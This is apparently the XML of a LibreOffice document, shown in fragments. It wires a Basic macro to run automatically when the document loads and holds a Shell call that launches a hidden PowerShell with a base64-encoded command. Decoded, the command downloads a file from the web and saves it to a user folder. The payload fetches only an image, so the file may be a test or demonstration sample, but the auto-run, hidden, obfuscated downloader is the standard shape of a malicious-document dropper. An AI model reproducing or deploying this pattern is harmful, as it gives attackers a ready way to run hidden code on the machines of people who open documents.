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>
    <office:event-listeners>
      <script:event-listener script:language="ooo:script" script:event-name="dom:load" xlink:href="vnd.sun.star.script:Standard.Module1.Main?language=Basic&amp;location=document" xlink:type="simple"/>
    </office:event-listeners>
  </office:scripts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8T09:21:30.262642844</meta:creation-date>
    <dc:date>2023-03-15T15:39:50.418000000</dc:date>
    <meta:editing-duration>PT24M23S</meta:editing-duration>
    <meta:editing-cycles>3</meta:editing-cycles>
    <meta:generator>LibreOffice/7.0.4.2$Windows_x86 LibreOffice_project/dcf040e67528d9187c66b2379df5ea4407429775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Shell("cmd.exe /MIN /C ",0,"powershell.exe -nop -w hidden -encodedCommand SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAAIgBoAHQAdABwAHMAOgAvAC8AYQBiAG8AdQB0AC4AbwBwAGUAbgBsAGkAYgBoAHUAbQBzAC4AbwByAGcALwB3AHAALQBjAG8AbgB0AGUAbgB0AC8AdQBwAGwAbwBhAGQAcwAvADIAMAAxADUALwAwADkALwB1AGMAbAAtAGwAbwBnAG8AMQAtADEAMAAyADQAeAAzADUANwAuAGoAcABnACIAIAAtAE8AdQB0AEYAaQBsAGUAIAAiAEMAOgBcAFUAcwBlAHIAcwBcAGwAdQBjAGEAcwBcAGkAbQBhAGcAZQAuAGoAcABnACIA",""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